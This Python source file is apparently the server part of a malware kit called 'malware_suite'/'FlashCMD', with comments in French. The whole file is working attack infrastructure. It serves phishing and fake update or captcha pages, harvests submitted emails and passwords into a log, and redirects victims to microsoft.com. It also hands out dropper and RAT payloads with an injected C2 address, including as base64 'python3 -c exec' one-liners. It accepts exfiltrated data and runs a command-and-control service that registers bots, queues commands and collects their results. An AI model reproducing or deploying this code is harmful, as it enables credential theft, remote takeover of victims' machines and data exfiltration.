#!/usr/bin/env python3
"""
malware_suite/server.py — v2 corrigé
Serveur HTTP tout-en-un :
  - sert les pages piège avec substitution SERVER_IP automatique
  - livre les payloads Python avec injection C2
  - collecte credentials, exfil, bots
  - C2 complet : register / task / result / push
  - endpoint /c2/creds pour le dashboard
Runtime : Python 3.10+ | stdlib pure, aucune dépendance externe
"""

import os, json, datetime, threading, urllib.parse, base64, pathlib, socket
from http.server import HTTPServer, BaseHTTPRequestHandler

# ── config ───────────────────────────────────────────────────
HOST        = "0.0.0.0"
PORT        = 8080
LOG_FILE    = "visits.log"
CREDS_FILE  = "creds.log"
EXFIL_FILE  = "exfil.log"
PAYLOAD_DIR = pathlib.Path("payloads")
PAGE_DIR    = pathlib.Path("pages")

# IP publique auto-détectée (remplacer par ton IP publique si derrière NAT)
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

SERVER_IP = get_local_ip()

bots      = {}
bots_lock = threading.Lock()

# ── logger ───────────────────────────────────────────────────
def log(entry: dict):
    entry["ts"] = datetime.datetime.now().isoformat()
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    print(f"[{entry['ts']}] {entry.get('type','?')} | "
          f"{entry.get('ip','?')} | {entry.get('detail','')}")

# ── payload builder ──────────────────────────────────────────
def build_payload(name: str, c2_host: str, c2_port: str) -> bytes:
    p = PAYLOAD_DIR / name
    if not p.exists():
        return f"# payload not found: {name}".encode()
    code = p.read_text()
    code = code.replace("FILL_C2_HOST", c2_host)
    code = code.replace("FILL_PORT",    c2_port)
    code = code.replace("FILL_C2_URL",  f"http://{c2_host}:{c2_port}")
    return code.encode()

def b64_oneliner(payload_bytes: bytes) -> str:
    b64 = base64.b64encode(payload_bytes).decode()
    return (f"python3 -c \""
            f"exec(__import__('base64').b64decode('{b64}').decode())\"")

# ── request handler ─────────────────────────────────────────
class Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass

    def _ip(self):
        xff = self.headers.get("X-Forwarded-For")
        return xff.split(",")[0].strip() if xff else self.client_address[0]

    def _parse_body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        if not length:
            return {}
        body = self.rfile.read(length).decode("utf-8", "ignore")
        try:
            return json.loads(body)
        except Exception:
            return dict(urllib.parse.parse_qsl(body))

    def _send(self, code: int, ctype: str, body):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", len(body))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _serve_page(self, path: pathlib.Path, ctype="text/html"):
        """Sert une page HTML avec substitution SERVER_IP."""
        if not path.exists():
            self._send(404, "text/plain", b"404")
            return
        content = path.read_text()
        content = content.replace("FILL_SERVER", SERVER_IP)
        content = content.replace("FILL_PORT",   str(PORT))
        content = content.replace("FILL_C2_HOST", SERVER_IP)
        self._send(200, ctype, content.encode())

    # ── GET ────────────────────────────────────────────────
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path   = parsed.path.rstrip("/") or "/"
        qs     = dict(urllib.parse.parse_qsl(parsed.query))
        ip     = self._ip()
        ua     = self.headers.get("User-Agent", "")

        log({"type": "GET", "ip": ip, "path": path,
             "ua": ua[:120], "detail": path})

        # ── pages piège ──────────────────────────────────
        if path in ("/", "/index"):
            self._serve_page(PAGE_DIR / "index.html")

        elif path == "/update":
            self._serve_page(PAGE_DIR / "update.html")

        elif path == "/captcha":
            self._serve_page(PAGE_DIR / "captcha.html")

        # ── livraison payload ────────────────────────────
        elif path == "/payload":
            name     = qs.get("name", "dropper") + ".py"
            c2_host  = qs.get("c2",   SERVER_IP)
            c2_port  = qs.get("port", str(PORT))
            payload  = build_payload(name, c2_host, c2_port)
            log({"type": "PAYLOAD_SERVED", "ip": ip, "detail": name})
            self._send(200, "text/plain", payload)

        # ── one-liner base64 ─────────────────────────────
        elif path == "/oneliner":
            name    = qs.get("name", "rat") + ".py"
            c2_host = qs.get("c2",   SERVER_IP)
            c2_port = qs.get("port", str(PORT))
            payload = build_payload(name, c2_host, c2_port)
            line    = b64_oneliner(payload)
            log({"type": "ONELINER_SERVED", "ip": ip, "detail": name})
            self._send(200, "text/plain", line.encode())

        # ── C2 dashboard ─────────────────────────────────
        elif path == "/c2":
            self._serve_page(pathlib.Path("c2") / "dashboard.html")

        elif path == "/c2/bots":
            with bots_lock:
                self._send(200, "application/json",
                           json.dumps(bots).encode())

        elif path.startswith("/c2/task/"):
            bot_id = path.split("/")[-1]
            with bots_lock:
                b     = bots.get(bot_id, {})
                tasks = b.get("tasks", [])
                task  = tasks.pop(0) if tasks else ""
                if bot_id in bots:
                    bots[bot_id]["tasks"] = tasks
            self._send(200, "application/json",
                       json.dumps({"cmd": task}).encode())

        # ── creds lisibles par le dashboard ──────────────
        elif path == "/c2/creds":
            try:
                data = open(CREDS_FILE).read()
            except FileNotFoundError:
                data = "(vide)"
            self._send(200, "text/plain", data.encode())

        # ── exfil log ────────────────────────────────────
        elif path == "/c2/exfil":
            try:
                data = open(EXFIL_FILE).read()
            except FileNotFoundError:
                data = "(vide)"
            self._send(200, "text/plain", data.encode())

        # ── visits log ───────────────────────────────────
        elif path == "/c2/visits":
            try:
                data = open(LOG_FILE).read()
            except FileNotFoundError:
                data = "(vide)"
            self._send(200, "text/plain", data.encode())

        else:
            self._send(404, "text/plain", b"404")

    # ── POST ───────────────────────────────────────────────
    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path   = parsed.path.rstrip("/")
        ip     = self._ip()
        body   = self._parse_body()

        log({"type": "POST", "ip": ip, "path": path,
             "detail": str(body)[:200]})

        # ── collecte credentials ─────────────────────────
        if path == "/collect":
            entry = {
                "ts":       datetime.datetime.now().isoformat(),
                "ip":       ip,
                "email":    body.get("email", ""),
                "password": body.get("password", ""),
                "page":     body.get("page", ""),
                "ua":       body.get("ua", ""),
                "tz":       body.get("tz", ""),
                "extra":    {k: v for k, v in body.items()
                             if k not in ("email","password","page","ua","tz")},
            }
            with open(CREDS_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")
            log({"type": "CREDS", "ip": ip,
                 "detail": f"{entry['email']} / {entry['password']}"})
            # Redirect vers vrai site
            self.send_response(302)
            self.send_header("Location", "https://microsoft.com")
            self.end_headers()

        # ── C2 register ──────────────────────────────────
        elif path == "/c2/register":
            bot_id = body.get("id", ip)
            with bots_lock:
                if bot_id not in bots:
                    bots[bot_id] = {
                        "ip":         ip,
                        "os":         body.get("os", "?"),
                        "user":       body.get("user", "?"),
                        "first_seen": datetime.datetime.now().isoformat(),
                        "tasks":      [],
                        "results":    [],
                    }
                bots[bot_id]["last_seen"] = \
                    datetime.datetime.now().isoformat()
            self._send(200, "application/json", b'{"ok":true}')

        # ── C2 result ────────────────────────────────────
        elif path.startswith("/c2/result/"):
            bot_id = path.split("/")[-1]
            result = body.get("result", "")
            with bots_lock:
                if bot_id in bots:
                    bots[bot_id].setdefault("results", []).append({
                        "ts":     datetime.datetime.now().isoformat(),
                        "output": result,
                    })
                else:
                    # Bot inconnu — l'enregistrer quand même
                    bots[bot_id] = {
                        "ip":         ip,
                        "os":         "?",
                        "user":       "?",
                        "first_seen": datetime.datetime.now().isoformat(),
                        "last_seen":  datetime.datetime.now().isoformat(),
                        "tasks":      [],
                        "results":    [{"ts": datetime.datetime.now().isoformat(),
                                        "output": result}],
                    }
            log({"type": "BOT_RESULT", "ip": ip,
                 "detail": result[:200]})
            self._send(200, "application/json", b'{"ok":true}')

        # ── C2 push task ─────────────────────────────────
        elif path.startswith("/c2/push/"):
            bot_id = path.split("/")[-1]
            cmd    = body.get("cmd", "")
            with bots_lock:
                if bot_id in bots:
                    bots[bot_id].setdefault("tasks", []).append(cmd)
                else:
                    bots[bot_id] = {
                        "ip": ip, "os": "?", "user": "?",
                        "first_seen": datetime.datetime.now().isoformat(),
                        "last_seen":  datetime.datetime.now().isoformat(),
                        "tasks":   [cmd],
                        "results": [],
                    }
            self._send(200, "application/json", b'{"ok":true}')

        # ── exfil ────────────────────────────────────────
        elif path == "/exfil":
            with open(EXFIL_FILE, "a") as f:
                f.write(json.dumps({
                    "ts":   datetime.datetime.now().isoformat(),
                    "ip":   ip,
                    "data": body,
                }) + "\n")
            log({"type": "EXFIL", "ip": ip,
                 "detail": str(body)[:300]})
            self._send(200, "application/json", b'{"ok":true}')

        else:
            self._send(404, "text/plain", b"404")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

# ── main ─────────────────────────────────────────────────────
if __name__ == "__main__":
    srv = HTTPServer((HOST, PORT), Handler)
    print(f"\n{'='*56}")
    print(f"  FlashCMD server — http://{SERVER_IP}:{PORT}")
    print(f"{'='*56}")
    print(f"  Pages piège  : /  /update  /captcha")
    print(f"  Payload      : /payload?name=<n>&c2={SERVER_IP}&port={PORT}")
    print(f"  One-liner    : /oneliner?name=<n>&c2={SERVER_IP}&port={PORT}")
    print(f"  C2 dashboard : /c2")
    print(f"  C2 creds     : /c2/creds")
    print(f"  C2 bots      : /c2/bots")
    print(f"  Visits log   : /c2/visits")
    print(f"{'='*56}\n")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")